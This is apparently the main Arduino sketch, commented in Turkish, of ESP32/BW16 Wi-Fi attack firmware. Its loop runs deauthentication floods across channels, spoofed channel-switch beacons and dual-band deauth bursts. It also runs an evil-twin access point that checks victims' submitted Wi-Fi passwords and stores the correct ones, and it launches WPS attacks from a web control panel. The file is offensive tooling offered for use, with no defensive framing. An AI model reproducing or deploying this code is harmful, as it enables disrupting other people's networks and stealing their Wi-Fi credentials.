#include <WiFi.h>
#include "platform_compat.h"
#include "types.h"
#include "board_hal.h"
#include "web_interface.h"
#include "deauth.h"
#include "evil_twin.h"
#include "passwords.h"
#include "definitions.h"
#include "wps_attack.h"

#ifndef BOARD_BW16
#include <esp_wifi.h>
#endif

int curr_channel       = 1;
int curr_5ghz_idx      = 0;
bool sweep_5ghz        = false;

static unsigned long last_csa_send        = 0;
static unsigned long last_retrack         = 0;
static unsigned long last_companion_burst = 0;  // Çift bant burst zamanlayıcısı

// ─── Maks Performans ─────────────────────────────────────────────────────────
void apply_max_performance() {
  hal_apply_max_performance();
}

void reapply_wifi_power() {
#ifndef BOARD_BW16
  extern bool et_wps_pbc_running;
  hal_reapply_wifi_power(et_wps_pbc_running);
#else
  hal_reapply_wifi_power(false);
#endif
}

// ─── WiFi Olay İşleyici (yalnızca ESP32) ─────────────────────────────────────
#ifndef BOARD_BW16
static void on_wifi_event(WiFiEvent_t event) {
#ifndef BOARD_BW16
  extern bool et_wps_pbc_running;
#endif
  hal_reapply_wifi_power(et_wps_pbc_running);
}
#endif

// ─── BW16: bir sonraki tarama kanalına geç ───────────────────────────────────
static void bw16_advance_channel() {
#ifdef BOARD_BW16
  if (!sweep_5ghz) {
    curr_channel++;
    if (curr_channel > CHANNEL_MAX) {
      curr_channel  = 1;
      sweep_5ghz    = true;
      curr_5ghz_idx = 0;
    }
    hal_wifi_set_channel(curr_channel);
  } else {
    hal_wifi_set_channel(CHANNELS_5GHZ[curr_5ghz_idx]);
    curr_5ghz_idx++;
    if (curr_5ghz_idx >= CHANNELS_5GHZ_COUNT) {
      curr_5ghz_idx = 0;
      sweep_5ghz    = false;
    }
  }
#endif
}

// ─── Tek seferlik başlatma ────────────────────────────────────────────────────
void setup() {
#ifdef SERIAL_DEBUG
  Serial.begin(115200);
#endif
#ifdef LED
  pinMode(LED, OUTPUT);
  led_off();
#endif

  passwords_init();
  hal_hw_init();

#ifndef BOARD_BW16
  WiFi.onEvent(on_wifi_event);
#endif

#ifndef BOARD_BW16
  WiFi.mode(WIFI_MODE_APSTA);
#endif
  WiFi_softAP(AP_SSID, AP_PASS);
  apply_max_performance();

  start_web_interface();
  DEBUG_PRINTLN("Hazir. 192.168.4.1 adresine baglanin.");
#ifdef BOARD_BW16
  DEBUG_PRINTLN("Platform: BW16 RTL8720DN — 2.4GHz + 5GHz");
#else
  DEBUG_PRINTLN("Platform: ESP32 — 2.4GHz");
#endif
}

void loop() {
  reapply_wifi_power();

  if (deauth_type == DEAUTH_TYPE_ALL) {
#ifdef BOARD_BW16
    bw16_advance_channel();
#else
    if (curr_channel > CHANNEL_MAX) curr_channel = 1;
    hal_wifi_set_channel(curr_channel);
    curr_channel++;
#endif
    delay(10);

  } else if (evil_twin_active) {
    extern bool et_test_pending, et_result_ready, et_result_correct;
    extern bool et_wps_pbc_running;

    if (et_test_pending && !et_result_ready) {
      bool wps_was_running = et_wps_pbc_running;
      if (wps_was_running) {
        et_stop_wps_pbc();
        delay(300);
      }

      et_result_correct = evil_twin_test_password(et_tested_password);
      et_result_ready   = true;
      et_test_pending   = false;
      reapply_wifi_power();

      if (et_result_correct) {
        passwords_save(et_tested_ssid, et_tested_password);
        stop_evil_twin();
        led_on();
      } else if (wps_was_running) {
        delay(800);
        et_start_wps_pbc();
      }
    }
    evil_twin_loop();
    web_interface_handle_client();

  } else if (wps_attack_state == WPS_ATTACKING) {
    wps_loop();
    web_interface_handle_client();

  } else {
    web_interface_handle_client();

    if (et_start_pending) {
      et_start_pending = false;
      start_evil_twin(et_start_wifi_number);
    }

    if (rescan_pending) {
      rescan_pending = false;
      web_interface_do_rescan();
    }

    if (wps_scan_pending) {
      wps_scan_pending = false;
      wps_scan();
    }

    if (wps_attack_pending) {
      wps_attack_pending = false;
      wps_start_attack(wps_attack_pending_idx);
    }

    unsigned long now = millis();

    if (deauth_type == DEAUTH_TYPE_SINGLE && deauth_target_ssid[0] != '\0') {
      if (now - last_csa_send >= CSA_INTERVAL_MS) {
        last_csa_send = now;
        send_csa_beacon();
      }
      if (now - last_retrack >= RETRACK_INTERVAL_MS) {
        last_retrack = now;
        retrack_deauth_target();
      }
      // ── Çift bant: eşlikçi kanala periyodik deauth patlaması ──────────────
      // Her 2 saniyede bir eşlikçi kanalına (örn. 5GHz) atlar, broadcast
      // deauth patlatır ve birincil kanala geri döner.
      if (deauth_has_companion && now - last_companion_burst >= 2000) {
        last_companion_burst = now;
        send_companion_deauth_burst();
      }
    }
  }
}
